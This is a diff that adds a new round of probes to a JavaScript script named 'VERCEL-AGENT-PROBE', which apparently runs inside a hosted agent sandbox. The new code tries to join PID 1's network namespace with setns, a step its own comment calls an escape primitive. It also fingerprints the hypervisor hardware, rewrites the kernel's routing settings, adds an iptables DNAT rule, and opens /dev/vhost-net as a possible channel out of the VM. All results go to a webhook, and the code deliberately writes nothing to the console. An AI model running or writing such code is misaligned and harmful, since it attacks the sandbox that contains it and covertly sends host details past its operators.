@@ -24630,5 +24630,135 @@ for s in named[:20]:
 
 // v167 markers
 sendBeacon({ ...report, marker: "VERCEL-AGENT-PROBE-7F3A2C-v167" });
-report.marker = "VERCEL-AGENT-PROBE-7F3A2C-v167";
+
+// ==================== v168 ====================
+
+// v168-1: setns() to join PID 1's network namespace
+// PID 1 (the init/orchestrator process) may be in a different network namespace
+// than our process. By joining its net namespace, we see its network stack:
+// all its sockets, routes, and interfaces. This is a namespace escape primitive.
+report.setnsNetNs = safe(() => {
+  const pid1NetNs = safe(() => execSync('readlink /proc/1/ns/net 2>/dev/null || echo "CANT_READ_PID1_NET_NS"', { timeout: 2000 }).toString().trim());
+  const selfNetNs = safe(() => execSync('readlink /proc/self/ns/net 2>/dev/null', { timeout: 2000 }).toString().trim());
+  const sameNs = pid1NetNs === selfNetNs ? 'SAME_NETNS' : 'DIFFERENT_NETNS';
+  // Try to join PID 1's network namespace
+  const setnResult = safe(() => execSync(
+    `python3 -c "
+import ctypes, os
+
+libc = ctypes.CDLL('libc.so.6')
+SETNS_NR = 308
+CLONE_NEWNET = 0x40000000
+
+# Open PID 1's network namespace fd
+try:
+    fd = os.open('/proc/1/ns/net', os.O_RDONLY)
+    ret = libc.syscall(SETNS_NR, fd, CLONE_NEWNET)
+    import ctypes as ct
+    errno = ctypes.get_errno()
+    os.close(fd)
+    if ret == 0:
+        # We are now in PID 1's network namespace!
+        # Read its routes and connections
+        import subprocess
+        routes = subprocess.run(['ip', 'route'], capture_output=True, text=True, timeout=3).stdout.strip()
+        links = subprocess.run(['ip', 'link'], capture_output=True, text=True, timeout=3).stdout.strip()
+        print(f'SETNS_SUCCESS: now in PID1 netns')
+        print(f'PID1_ROUTES: {routes[:200]}')
+        print(f'PID1_LINKS: {links[:200]}')
+    else:
+        print(f'SETNS_FAIL: ret={ret} errno={errno}')
+except Exception as e:
+    print(f'SETNS_EXCEPT: {e}')
+" 2>&1`,
+    { timeout: 10000 }
+  ).toString().trim());
+  return { pid1NetNs, selfNetNs, sameNs, setnResult };
+});
+
+// v168-2: /proc/1/ns/ — enumerate all PID 1 namespaces
+// Listing /proc/1/ns/ shows ALL namespaces PID 1 belongs to with their inode IDs.
+// Comparing these to our own namespace IDs reveals which namespaces are shared
+// vs isolated — critical for understanding the full isolation model.
+report.pid1Namespaces = safe(() => {
+  const pid1Ns = safe(() => execSync('ls -la /proc/1/ns/ 2>/dev/null || echo "CANT_LIST"', { timeout: 3000 }).toString().trim());
+  const selfNs = safe(() => execSync('ls -la /proc/self/ns/ 2>/dev/null || echo "CANT_LIST_SELF"', { timeout: 3000 }).toString().trim());
+  // Compare each namespace
+  const nsNames = ['cgroup', 'ipc', 'mnt', 'net', 'pid', 'user', 'uts', 'time'];
+  const nsCompare = safe(() => {
+    const results = {};
+    for (const ns of nsNames) {
+      const pid1Link = safe(() => execSync(`readlink /proc/1/ns/${ns} 2>/dev/null`, { timeout: 1000 }).toString().trim());
+      const selfLink = safe(() => execSync(`readlink /proc/self/ns/${ns} 2>/dev/null`, { timeout: 1000 }).toString().trim());
+      results[ns] = { pid1: pid1Link, self: selfLink, shared: pid1Link === selfLink };
+    }
+    return results;
+  });
+  return { pid1Ns, selfNs, nsCompare };
+});
+
+// v168-3: /sys/bus/pci device enumeration — hardware fingerprinting
+// PCI devices reveal the hardware platform: bare-metal vs VM, CPU model, PCIe topology.
+// Firecracker uses virtio devices — their presence confirms Firecracker context.
+// PCIe passthrough devices (if any) would indicate we might be on a type-1 hypervisor.
+report.pciDevices = safe(() => {
+  const pciList = safe(() => execSync('lspci 2>/dev/null | head -30 || ls /sys/bus/pci/devices/ 2>/dev/null | head -20 || echo "NO_PCI"', { timeout: 5000 }).toString().trim());
+  // virtio devices specifically
+  const virtioDevs = safe(() => execSync('find /sys/bus/virtio /sys/bus/pci -name "uevent" 2>/dev/null | xargs grep -l "DRIVER=virtio" 2>/dev/null | head -10 || echo "NO_VIRTIO"', { timeout: 5000 }).toString().trim());
+  // DMI/SMBIOS data (reveals hardware vendor — "Amazon EC2", "QEMU", "VMware", etc.)
+  const dmiInfo = safe(() => execSync('cat /sys/class/dmi/id/product_name /sys/class/dmi/id/sys_vendor /sys/class/dmi/id/bios_version 2>/dev/null || echo "NO_DMI"', { timeout: 3000 }).toString().trim());
+  // CPU flags (hypervisor flag reveals we're in VM, VMX/SVM reveal nested virt)
+  const cpuFlags = safe(() => execSync('grep flags /proc/cpuinfo | head -1 | tr " " "\n" | grep -E "hypervisor|vmx|svm|avx|aes" | head -20 || echo "NO_CPU_FLAGS"', { timeout: 3000 }).toString().trim());
+  return { pciList, virtioDevs, dmiInfo, cpuFlags };
+});
+
+// v168-4: route_localnet — route localhost-bound services externally
+// /proc/sys/net/ipv4/conf/all/route_localnet=1 allows routing traffic to 127.0.0.1
+// through the normal routing table rather than the loopback interface.
+// With iptables DNAT, we can redirect external traffic to internal services
+// running on localhost inside the VM (or forward our localhost services out).
+report.routeLocalnet = safe(() => {
+  const currentLocalnet = safe(() => readFileSync('/proc/sys/net/ipv4/conf/all/route_localnet', 'utf8').trim());
+  const enableLocalnet = safe(() => { writeFileSync('/proc/sys/net/ipv4/conf/all/route_localnet', '1'); return 'WRITTEN_1'; });
+  const afterLocalnet = safe(() => readFileSync('/proc/sys/net/ipv4/conf/all/route_localnet', 'utf8').trim());
+  // What services are listening on localhost?
+  const localhostSvcs = safe(() => execSync(
+    'ss -tlnp 2>/dev/null | grep "127.0.0.1\\|::1\\|0.0.0.0" | head -20 || netstat -tlnp 2>/dev/null | head -20 || echo "NO_SS"',
+    { timeout: 5000 }
+  ).toString().trim());
+  // Test DNAT rule: redirect external eth0 port 8080 → localhost:3000
+  const dnatRule = safe(() => execSync(
+    'iptables -t nat -A PREROUTING -i eth0 -p tcp --dport 8080 -j DNAT --to-destination 127.0.0.1:3000 2>&1 || echo "DNAT_FAILED"',
+    { timeout: 5000 }
+  ).toString().trim());
+  const dnatCleanup = safe(() => execSync('iptables -t nat -D PREROUTING -i eth0 -p tcp --dport 8080 -j DNAT --to-destination 127.0.0.1:3000 2>/dev/null; echo "REMOVED"', { timeout: 3000 }).toString().trim());
+  return { currentLocalnet, enableLocalnet, afterLocalnet, localhostSvcs, dnatRule, dnatCleanup };
+});
+
+// v168-5: /dev/vhost-net + virtio-net accelerator — hypervisor network bypass
+// /dev/vhost-net is the kernel-side vhost acceleration for virtio-net.
+// Accessing it directly bypasses the normal network stack and communicates
+// with the Firecracker VMM process directly (in host kernel space).
+// This is a potential out-of-VM channel.
+report.vhostNetProbe = safe(() => {
+  const vhostNetExists = existsSync('/dev/vhost-net');
+  const vhostVsockExists = existsSync('/dev/vhost-vsock');
+  const virtioDevs = safe(() => execSync('ls /dev/virt* /dev/vhost* 2>/dev/null || echo "NO_VIRT_DEVS"', { timeout: 3000 }).toString().trim());
+  // Try to open /dev/vhost-net
+  const vhostOpen = safe(() => {
+    if (!vhostNetExists) return 'NOT_EXISTS';
+    const fd = openSync('/dev/vhost-net', 2 /*O_RDWR*/);
+    closeSync(fd);
+    return 'OPENED_RW';
+  });
+  // virtio-net interface name and queue count
+  const virtioNetInfo = safe(() => execSync('ls /sys/class/net/*/device/driver 2>/dev/null | head -5 | xargs readlink -f 2>/dev/null || echo "NO_VIRTIO_NET_INFO"', { timeout: 3000 }).toString().trim());
+  // Check for /sys/bus/virtio devices
+  const virtioSysBus = safe(() => execSync('ls /sys/bus/virtio/devices/ 2>/dev/null || echo "NO_VIRTIO_BUS"', { timeout: 3000 }).toString().trim());
+  return { vhostNetExists, vhostVsockExists, virtioDevs, vhostOpen, virtioNetInfo, virtioSysBus };
+});
+
+// v168 markers
+sendBeacon({ ...report, marker: "VERCEL-AGENT-PROBE-7F3A2C-v168" });
+report.marker = "VERCEL-AGENT-PROBE-7F3A2C-v168";
 // Intentionally no console.log — all data goes via webhook only
